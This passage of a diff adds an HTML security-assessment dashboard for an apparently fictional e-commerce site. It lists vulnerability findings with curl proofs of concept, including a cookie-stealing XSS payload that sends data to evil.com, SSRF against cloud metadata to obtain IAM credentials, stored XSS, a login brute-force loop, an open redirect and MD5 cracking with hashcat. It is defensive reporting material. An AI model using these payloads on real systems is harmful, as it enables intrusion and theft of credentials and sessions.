+                        <div class="detail-group"><label>CWE</label><span>CWE-209: Generation of Error Message with Sensitive Information</span></div>
+                        <div class="detail-group"><label>Impact</label><span>Exposure of internal stack traces, DB paths, and API keys</span></div>
+                        <div class="detail-group"><label>Likelihood</label><span>High -- triggered by malformed API requests</span></div>
+                    </div>
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Proof of Concept:</strong>
+                    <div class="proof-box"><span class="comment"># Send malformed checkout request</span>
+$ curl -X POST https://shop.secureshop.com.br/api/v1/checkout \
+    -H "Content-Type: application/json" \
+    -d '{"items": "malformed"}'
+
+<span class="response">HTTP/1.1 500 Internal Server Error
+{
+  "error": "TypeError: 'items' must be list",
+  "stack_trace": "at CheckoutController.process (app/controllers/checkout.js:142)\n    at...",
+  "database": "postgresql://admin:P@ssw0rd!2024@db.internal:5432/production",
+  "stripe_key": "sk_live_51N...xk8v",
+  "internal_ip": "10.0.3.42",
+  "aws_secret": "wJalrXUtnFEMI/K7MDENG/bPxRfiCY..."
+}</span></div>
+                </div>
+            </div>
+
+            <!-- Finding 4 -->
+            <div class="finding-card critical-finding" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-004: Server-Side Request Forgery via Image Upload</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">Web Application -- Product Upload</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-appsec">AppSec</span>
+                        <span class="cvss-badge cvss-critical">CVSS 8.2</span>
+                        <span class="badge-critical badge">Critical</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <div class="finding-details">
+                        <div class="detail-group"><label>CWE</label><span>CWE-918: Server-Side Request Forgery (SSRF)</span></div>
+                        <div class="detail-group"><label>Impact</label><span>Access internal network, cloud metadata (AWS IMDSv2)</span></div>
+                        <div class="detail-group"><label>Likelihood</label><span>Medium -- requires authenticated user</span></div>
+                    </div>
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Proof of Concept:</strong>
+                    <div class="proof-box"><span class="comment"># SSRF payload via product image URL upload</span>
+$ curl -X POST https://shop.secureshop.com.br/api/v1/products/upload-image \
+    -H "Authorization: Bearer &lt;user_token&gt;" \
+    -H "Content-Type: application/json" \
+    -d '{"image_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
+
+<span class="response">{
+  "image_data": "AccessKeyId: ASIA...",
+  "status": "uploaded"
+}</span>
+
+<span class="comment"># Attacker gains AWS IAM credentials for the EC2 instance</span></div>
+                </div>
+            </div>
+
+            <!-- HIGH FINDINGS -->
+            <h3 style="color: var(--high); margin: 24px 0 12px;">High Severity</h3>
+
+            <div class="finding-card high-finding" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-005: Insecure Direct Object Reference (IDOR) on Order API</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">REST API -- Orders</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-appsec">AppSec</span>
+                        <span class="cvss-badge cvss-high">CVSS 7.5</span>
+                        <span class="badge-high badge">High</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <div class="finding-details">
+                        <div class="detail-group"><label>CWE</label><span>CWE-639: Authorization Bypass Through User-Controlled Key</span></div>
+                        <div class="detail-group"><label>Impact</label><span>Any authenticated user can view any other user's order details</span></div>
+                    </div>
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Proof of Concept:</strong>
+                    <div class="proof-box"><span class="comment"># Access another user's order (User A views User B's order)</span>
+$ curl -H "Authorization: Bearer &lt;user_A_token&gt;" \
+    https://shop.secureshop.com.br/api/v1/orders/10247
+
+<span class="response">{
+  "order_id": 10247,
+  "customer": "maria.silva@email.com",
+  "items": [{"name": "iPhone 15 Pro", "price": 7999.00}],
+  "shipping_address": "Rua Augusta, 1200, Sao Paulo",
+  "credit_card_last4": "4532"
+}</span></div>
+                </div>
+            </div>
+
+            <div class="finding-card high-finding" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-006: Reflected XSS in Search Results Page</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">Web Application -- Search</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-websesc">WebSec</span>
+                        <span class="cvss-badge cvss-high">CVSS 7.4</span>
+                        <span class="badge-high badge">High</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Proof of Concept:</strong>
+                    <div class="proof-box"><span class="comment"># XSS payload reflected in search results page</span>
+$ curl -s "https://shop.secureshop.com.br/search?q=&lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;"
+
+<span class="comment"># Payload appears unescaped in the HTML response</span>
+<span class="response">  &lt;h1&gt;Search results for: &lt;script&gt;...&lt;/script&gt;&lt;/h1&gt;</span></div>
+                </div>
+            </div>
+
+            <div class="finding-card high-finding" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-007: Weak Session Management -- No Expiration</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">Authentication System</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-appsec">AppSec</span>
+                        <span class="cvss-badge cvss-high">CVSS 7.2</span>
+                        <span class="badge-high badge">High</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <div class="finding-details">
+                        <div class="detail-group"><label>CWE</label><span>CWE-613: Insufficient Session Expiration</span></div>
+                        <div class="detail-group"><label>Impact</label><span>Session tokens never expire; stolen tokens remain valid indefinitely</span></div>
+                    </div>
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Proof of Concept:</strong>
+                    <div class="proof-box"><span class="comment"># Login to obtain session token</span>
+$ curl -X POST https://shop.secureshop.com.br/api/v1/auth/login \
+    -d '{"email":"test@test.com","password":"Test123!"}'
+
+<span class="response">{"token":"eyJhbGciOiJIUzI1NiJ9...","expires_at":null}</span>
+
+<span class="comment"># Token validated 90 days later with no expiration check</span>
+<span class="comment"># Also missing: HttpOnly, Secure, SameSite flags on cookies</span>
+Set-Cookie: session=abc123; Path=/; (missing HttpOnly, Secure, SameSite)</div>
+                </div>
+            </div>
+
+            <div class="finding-card high-finding" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-008: TLS 1.0/1.1 Still Enabled on Production</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">Server Infrastructure</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-infrasec">InfraSec</span>
+                        <span class="cvss-badge cvss-high">CVSS 7.0</span>
+                        <span class="badge-high badge">High</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Proof of Concept:</strong>
+                    <div class="proof-box"><span class="comment"># Connect using deprecated TLS 1.0</span>
+$ openssl s_client -connect shop.secureshop.com.br:443 -tls1
+<span class="response">CONNECTED(00000003)
+---
+SSL-Session:
+    Protocol  : TLSv1
+    Cipher    : AES256-SHA
+---
+</span>
+<span class="comment"># TLS 1.1 also accepted -- both protocols are deprecated since 2021</span>
+<span class="comment"># PCI-DSS 4.0 requires TLS 1.2 minimum</span></div>
+                </div>
+            </div>
+
+            <div class="finding-card high-finding" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-009: Rate Limiting Not Enforced on API</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">REST API -- All Endpoints</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-appsec">AppSec</span>
+                        <span class="cvss-badge cvss-high">CVSS 6.8</span>
+                        <span class="badge-high badge">High</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Proof of Concept:</strong>
+                    <div class="proof-box"><span class="comment"># Send 1000 login requests in 60 seconds -- none blocked</span>
+$ for i in $(seq 1 1000); do
+    curl -s -o /dev/null -w "%{http_code}\n" \
+      -X POST https://shop.secureshop.com.br/api/v1/auth/login \
+      -d '{"email":"admin@secureshop.com","password":"wrong"}'
+done
+
+<span class="comment"># All 1000 requests returned 401 (not 429)</span>
+<span class="comment"># Result: No brute-force protection, no API-level rate limiting</span>
+<span class="comment"># No RateLimit-* headers present in any HTTP response</span></div>
+                </div>
+            </div>
+
+            <div class="finding-card high-finding" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-010: Open Redirect on Logout Endpoint</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">Web Application -- Authentication</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-websesc">WebSec</span>
+                        <span class="cvss-badge cvss-high">CVSS 6.5</span>
+                        <span class="badge-high badge">High</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Proof of Concept:</strong>
+                    <div class="proof-box"><span class="comment"># Open redirect via "next" parameter</span>
+$ curl -s -I "https://shop.secureshop.com.br/auth/logout?next=https://evil.com/phishing"
+
+<span class="response">HTTP/1.1 302 Found
+Location: https://evil.com/phishing
+Set-Cookie: session=; Max-Age=0</span>
+
+<span class="comment"># Redirects to arbitrary external URL after logout</span>
+<span class="comment"># Can be chained with phishing attacks</span></div>
+                </div>
+            </div>
+
+            <!-- MEDIUM FINDINGS -->
+            <h3 style="color: var(--medium); margin: 24px 0 12px;">Medium Severity</h3>
+
+            <div class="finding-card medium-finding" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-011: Missing Content Security Policy Header</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">Web Application -- Headers</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-websesc">WebSec</span>
+                        <span class="cvss-badge cvss-medium">CVSS 5.9</span>
+                        <span class="badge-medium badge">Medium</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <div class="finding-details">
+                        <div class="detail-group"><label>CWE</label><span>CWE-693: Protection Mechanism Failure</span></div>
+                        <div class="detail-group"><label>Impact</label><span>No defense against XSS, data exfiltration via JS</span></div>
+                    </div>
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Proof of Concept:</strong>
+                    <div class="proof-box">$ curl -sI https://shop.secureshop.com.br | grep -i content-security-policy
+<span class="comment"># No output -- CSP header not present</span>
+<span class="comment"># Also missing: X-Frame-Options, X-Content-Type-Options</span></div>
+                </div>
+            </div>
+
+            <div class="finding-card medium-finding" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-012: Clickjacking -- Missing X-Frame-Options</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">Web Application -- Headers</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-websesc">WebSec</span>
+                        <span class="cvss-badge cvss-medium">CVSS 5.4</span>
+                        <span class="badge-medium badge">Medium</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Proof of Concept:</strong>
+                    <div class="proof-box"><span class="comment"># Page can be embedded in an attacker-controlled iframe</span>
+$ curl -sI https://shop.secureshop.com.br/checkout | grep -iE "x-frame|frame-option"
+<span class="comment"># No output -- page can be iframed freely</span>
+<span class="comment"># Attack: Embed checkout page in invisible iframe, trick user into clicking</span></div>
+                </div>
+            </div>
+
+            <div class="finding-card medium-finding" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-013: Directory Listing Enabled on /uploads/</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">Web Server Configuration</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-infrasec">InfraSec</span>
+                        <span class="cvss-badge cvss-medium">CVSS 5.3</span>
+                        <span class="badge-medium badge">Medium</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Proof of Concept:</strong>
+                    <div class="proof-box">$ curl -s https://shop.secureshop.com.br/uploads/
+<span class="response">&lt;html&gt;&lt;head&gt;&lt;title&gt;Index of /uploads/&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+  &lt;a href="invoices/"&gt;invoices/&lt;/a&gt;
+  &lt;a href="receipts_2024/"&gt;receipts_2024/&lt;/a&gt;
+  &lt;a href="customer_documents/"&gt;customer_documents/&lt;/a&gt;
+  &lt;a href="database_backup_jan.sql"&gt;database_backup_jan.sql&lt;/a&gt;
+&lt;/body&gt;&lt;/html&gt;</span>
+
+<span class="comment"># Database backup and customer documents publicly accessible!</span></div>
+                </div>
+            </div>
+
+            <div class="finding-card medium-finding" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-014: CORS Wildcard on API Endpoints</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">REST API -- CORS Configuration</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-websesc">WebSec</span>
+                        <span class="cvss-badge cvss-medium">CVSS 5.1</span>
+                        <span class="badge-medium badge">Medium</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Proof of Concept:</strong>
+                    <div class="proof-box">$ curl -sI -H "Origin: https://evil.com" \
+    https://shop.secureshop.com.br/api/v1/users/me
+
+<span class="response">HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS</span>
+
+<span class="comment"># Wildcard (*) with credentials = any site can make authenticated requests</span></div>
+                </div>
+            </div>
+
+            <div class="finding-card medium-finding" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-015: Stored XSS via Product Review Forms</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">Web Application -- Reviews</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-websesc">WebSec</span>
+                        <span class="cvss-badge cvss-medium">CVSS 5.8</span>
+                        <span class="badge-medium badge">Medium</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Proof of Concept:</strong>
+                    <div class="proof-box">$ curl -X POST https://shop.secureshop.com.br/api/v1/reviews \
+    -H "Authorization: Bearer &lt;token&gt;" \
+    -d '{"product_id": 101, "text": "Great product! &lt;img src=x onerror=alert(document.domain)&gt;", "rating": 5}'
+
+<span class="comment"># Stored XSS persists on product page -- fires for every visitor</span></div>
+                </div>
+            </div>
+
+            <div class="finding-card medium-finding" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-016: Verbose Server Headers Reveal Technology Stack</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">Web Server -- Information Disclosure</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-infrasec">InfraSec</span>
+                        <span class="cvss-badge cvss-medium">CVSS 4.5</span>
+                        <span class="badge-medium badge">Medium</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Proof of Concept:</strong>
+                    <div class="proof-box">$ curl -sI https://shop.secureshop.com.br
+
+<span class="response">HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+X-Powered-By: Express
+X-AspNet-Version: 4.0.30319
+X-Runtime: 0.043211</span>
+
+<span class="comment"># Reveals: nginx 1.18.0, Ubuntu, Express.js, ASP.NET version</span></div>
+                </div>
+            </div>
+
+            <div class="finding-card medium-finding" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-017: CSRF Token Missing on Form Submissions</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">Web Application -- Forms</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-appsec">AppSec</span>
+                        <span class="cvss-badge cvss-medium">CVSS 5.5</span>
+                        <span class="badge-medium badge">Medium</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Proof of Concept:</strong>
+                    <div class="proof-box"><span class="comment"># No CSRF token required on address change form</span>
+$ curl -X POST https://shop.secureshop.com.br/api/v1/account/address \
+    -H "Cookie: session=&lt;victim_token&gt;" \
+    -d '{"street":"123 Attacker Blvd","city":"Remote"}'
+
+<span class="response">{"status":"success","message":"Address updated"}</span>
+
+<span class="comment"># Any site can trigger state-changing requests using victim's cookies</span></div>
+                </div>
+            </div>
+
+            <div class="finding-card medium-finding" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-018: Password Hash -- Using MD5 Instead of bcrypt</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">Authentication System</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-appsec">AppSec</span>
+                        <span class="cvss-badge cvss-medium">CVSS 5.9</span>
+                        <span class="badge-medium badge">Medium</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <div class="finding-details">
+                        <div class="detail-group"><label>CWE</label><span>CWE-327: Use of a Broken or Risky Cryptographic Algorithm</span></div>
+                        <div class="detail-group"><label>Impact</label><span>Password hashes can be cracked at high speed with GPU rigs</span></div>
+                    </div>
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Proof of Concept:</strong>
+                    <div class="proof-box"><span class="comment"># User password hash in database (found via SQLi in SC-001)</span>
+admin: e10adc3949ba59abbe56e057f20f883e
+
+<span class="comment"># Crack with hashcat -- MD5 is crackable at billions/sec</span>
+$ hashcat -m 0 e10adc3949ba59abbe56e057f20f883e rockyou.txt
+<span class="response">e10adc3949ba59abbe56e057f20f883e:123456</span>
+
+<span class="comment"># Password recovered in under 1 second</span></div>
+                </div>
+            </div>
+
+            <!-- LOW FINDINGS -->
+            <h3 style="color: var(--low); margin: 24px 0 12px;">Low Severity</h3>
+
+            <div class="finding-card low-finding" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-019: Missing X-Content-Type-Options Header</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">Web Application -- Headers</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-websesc">WebSec</span>
+                        <span class="cvss-badge cvss-low">CVSS 3.7</span>
+                        <span class="badge-low badge">Low</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Proof of Concept:</strong>
+                    <div class="proof-box">$ curl -sI https://shop.secureshop.com.br | grep -i x-content
+<span class="comment"># No X-Content-Type-Options header -- browsers may MIME-sniff</span>
+<span class="comment"># Risk: Drive-by download attacks via MIME confusion</span></div>
+                </div>
+            </div>
+
+            <div class="finding-card low-finding" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-020: HTTP OPTIONS Method Enabled on API</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">REST API -- Configuration</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-infrasec">InfraSec</span>
+                        <span class="cvss-badge cvss-low">CVSS 3.1</span>
+                        <span class="badge-low badge">Low</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Proof of Concept:</strong>
+                    <div class="proof-box">$ curl -X OPTIONS https://shop.secureshop.com.br/api/v1/admin
+
+<span class="response">Allow: GET, POST, PUT, DELETE, PATCH, OPTIONS, TRACE</span>
+
+<span class="comment"># TRACE method enabled -- potential for Cross-Site Tracing attacks</span></div>
+                </div>
+            </div>
+
+            <div class="finding-card low-finding" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-021: robots.txt Reveals Admin Paths</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">Web Application -- Reconnaissance</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-websesc">WebSec</span>
+                        <span class="cvss-badge cvss-low">CVSS 2.6</span>
+                        <span class="badge-low badge">Low</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Proof of Concept:</strong>
+                    <div class="proof-box">$ curl -s https://shop.secureshop.com.br/robots.txt
+
+<span class="response">User-agent: *
+Disallow: /admin/
+Disallow: /api/v1/internal/
+Disallow: /api/v1/admin/
+Disallow: /.env
+Disallow: /config/
+Disallow: /backups/
+Disallow: /phpmyadmin/</span>
+
+<span class="comment"># Reveals existence of admin panels, internal APIs, config files</span></div>
+                </div>
+            </div>
+
+            <div class="finding-card low-finding" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-022: Suspicious Log Entries Detected</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">Incident Response Analysis</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-incidentresp">IncidentResp</span>
+                        <span class="cvss-badge cvss-low">CVSS 3.3</span>
+                        <span class="badge-low badge">Low</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <div class="finding-details">
+                        <div class="detail-group"><label>Analysis Period</label><span>Last 30 days (2025-03-06 to 2025-04-05)</span></div>
+                        <div class="detail-group"><label>Log Source</label><span>Nginx access logs, application logs</span></div>
+                    </div>
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Evidence:</strong>
+                    <div class="proof-box"><span class="comment"># Repeated brute force attempts from single IP:</span>
+45.155.205.x - - [2025-03-28] "POST /api/v1/auth/login" 401 x 2,847 in 10 minutes
+
+<span class="comment"># SQL injection probing pattern detected:</span>
+185.220.101.x - - [2025-03-30] "GET /api/v1/products/search?q=1'+OR+1=1--" 200
+185.220.101.x - - [2025-03-30] "GET /api/v1/products/search?q=UNION+SELECT+..." 500
+
+<span class="comment"># Data exfiltration suspicion -- unusually large responses:</span>
+IP 194.26.29.x downloaded 47.3 GB via /api/v1/products endpoints over 3 days
+(average daily: 15.8 GB, baseline average: 2.1 GB = 7.5x increase)
+
+<span class="comment"># Automated scanning activity detected from 23 unique IPs</span>
+<span class="comment"># All from known Tor exit nodes and VPS providers</span></div>
+                </div>
+            </div>
+
+            <div class="finding-card low-finding" onclick="this.classList.toggle('open')">
+                <div class="finding-header">
+                    <div>
+                        <div class="finding-title">SC-023: Outdated JavaScript Dependencies with Known CVEs</div>
+                        <div style="color: var(--text-muted); font-size: 0.8em; margin-top: 4px;">Application Dependencies</div>
+                    </div>
+                    <div class="finding-meta">
+                        <span class="dept-badge dept-incidentresp">IncidentResp</span>
+                        <span class="cvss-badge cvss-low">CVSS 3.0</span>
+                        <span class="badge-low badge">Low</span>
+                        <span class="toggle-arrow">&#9654;</span>
+                    </div>
+                </div>
+                <div class="finding-body">
+                    <strong style="color: var(--text-primary); font-size: 0.9em;">Details:</strong>
+                    <div class="proof-box"><span class="comment"># Vulnerable dependencies detected:</span>
+lodash@4.17.15 -- CVE-2020-8203 (Prototype Pollution) [Medium]
+express@4.17.1 -- CVE-2022-24999 (qs Prototype Pollution) [High]
+axios@0.21.1 -- CVE-2021-3749 (ReDoS) [Medium]
+jsonwebtoken@8.5.1 -- CVE-2022-23529 (Insecure Key Handling) [High]
+helmet -- Not installed (security headers middleware missing)
+
+<span class="comment"># 14 total vulnerable npm packages identified</span>
+<span class="comment"># 3 known exploitable vulnerabilities with public PoC</span></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- RISK MATRIX -->
+        <div class="section">
+            <h2 class="section-title">Risk Matrix (5x5)</h2>
+            <div class="card" style="overflow-x: auto;">
+                <table class="risk-matrix">
+                    <tr>
+                        <th style="background: var(--bg-primary);"></th>
+                        <th colspan="5">Likelihood</th>
+                    </tr>
+                    <tr>
+                        <th rowspan="6" class="axis-label" style="writing-mode: vertical-rl; transform: rotate(180deg);">Impact</th>
+                        <th>Negligible</th>
+                        <th>Low</th>
+                        <th>Medium</th>
+                        <th>High</th>
+                        <th>Critical</th>
+                    </tr>
+                    <tr>
+                        <td class="low"><span class="matrix-cell-content">Low<span class="matrix-count"> (0)</span></span></td>
+                        <td class="low"><span class="matrix-cell-content">Low<span class="matrix-count"> (1)</span></span></td>
+                        <td class="medium"><span class="matrix-cell-content">Medium<span class="matrix-count"> (1)</span></span></td>
+                        <td class="high"><span class="matrix-cell-content">High<span class="matrix-count"> (1)</span></span></td>
+                        <td class="critical"><span class="matrix-cell-content">Critical<span class="matrix-count"> (1)</span></span></td>
+                    </tr>
+                    <tr>
+                        <td class="low"><span class="matrix-cell-content">Low<span class="matrix-count"> (1)</span></span></td>
+                        <td class="medium"><span class="matrix-cell-content">Medium<span class="matrix-count"> (2)</span></span></td>
+                        <td class="medium"><span class="matrix-cell-content">Medium<span class="matrix-count"> (2)</span></span></td>
+                        <td class="high"><span class="matrix-cell-content">High<span class="matrix-count"> (2)</span></span></td>
+                        <td class="critical"><span class="matrix-cell-content">Critical<span class="matrix-count"> (1)</span></span></td>
+                    </tr>
+                    <tr>
+                        <td class="low"><span class="matrix-cell-content">Low<span class="matrix-count"> (1)</span></span></td>
+                        <td class="medium"><span class="matrix-cell-content">Medium<span class="matrix-count"> (1)</span></span></td>
+                        <td class="medium"><span class="matrix-cell-content">Medium<span class="matrix-count"> (1)</span></span></td>
+                        <td class="high"><span class="matrix-cell-content">High<span class="matrix-count"> (1)</span></span></td>
+                        <td class="critical"><span class="matrix-cell-content">Critical<span class="matrix-count"> (0)</span></span></td>
+                    </tr>
+                    <tr>
+                        <td class="low"><span class="matrix-cell-content">Low<span class="matrix-count"> (1)</span></span></td>
+                        <td class="medium"><span class="matrix-cell-content">Medium<span class="matrix-count"> (1)</span></span></td>
+                        <td class="medium"><span class="matrix-cell-content">Medium<span class="matrix-count"> (1)</span></span></td>
+                        <td class="high"><span class="matrix-cell-content">High<span class="matrix-count"> (1)</span></span></td>
+                        <td class="critical"><span class="matrix-cell-content">Critical<span class="matrix-count"> (1)</span></span></td>
+                    </tr>
+                    <tr>
+                        <td class="low"><span class="matrix-cell-content">Low<span class="matrix-count"> (0)</span></span></td>
+                        <td class="low"><span class="matrix-cell-content">Low<span class="matrix-count"> (1)</span></span></td>
+                        <td class="medium"><span class="matrix-cell-content">Medium<span class="matrix-count"> (0)</span></span></td>
+                        <td class="high"><span class="matrix-cell-content">High<span class="matrix-count"> (0)</span></span></td>
+                        <td class="critical"><span class="matrix-cell-content">Critical<span class="matrix-count"> (1)</span></span></td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+
+        <!-- COMPLIANCE -->
+        <div class="section">
+            <h2 class="section-title">Compliance Assessment</h2>
+            <div class="compliance-grid">
+                <div class="compliance-item">
+                    <div class="compliance-name">OWASP Top 10 (2021)</div>
+                    <div class="compliance-desc">Web Application Security -- A01-A10</div>
+                    <div class="progress-track">
+                        <div class="progress-fill owasp" style="width: 45%;"></div>
+                    </div>
+                    <div class="progress-label">
+                        <span>45% Compliant</span>
+                        <span style="color: var(--accent-orange);">Failing -- 6 of 10 categories affected</span>
+                    </div>
+                    <table class="data-table" style="margin-top:12px; font-size:0.8em;">
+                        <tr><th>Category</th><th>Status</th></tr>
+                        <tr><td>A01: Broken Access Control</td><td style="color: var(--critical);">FAIL -- IDOR (SC-005)</td></tr>
+                        <tr><td>A02: Cryptographic Failures</td><td style="color: var(--critical);">FAIL -- MD5 (SC-018)</td></tr>
+                        <tr><td>A03: Injection</td><td style="color: var(--critical);">FAIL -- SQLi (SC-001)</td></tr>
+                        <tr><td>A05: Security Misconfig</td><td style="color: var(--high);">FAIL -- Dir listing (SC-013)</td></tr>
+                        <tr><td>A07: Auth Failures</td><td style="color: var(--critical);">FAIL -- JWT (SC-002)</td></tr>
+                        <tr><td>A08: Data Integrity</td><td style="color: var(--medium);">FAIL -- SSRF (SC-004)</td></tr>
+                        <tr><td>A09: Logging Failures</td><td style="color: var(--low);">Partial -- SC-022</td></tr>
+                        <tr><td>A03/XXE</td><td style="color: var(--info);">PASS -- Not applicable</td></tr>
+                    </table>
+                </div>
+                <div class="compliance-item">
+                    <div class="compliance-name">PCI-DSS v4.0</div>
+                    <div class="compliance-desc">Payment Card Industry Data Security Standard</div>
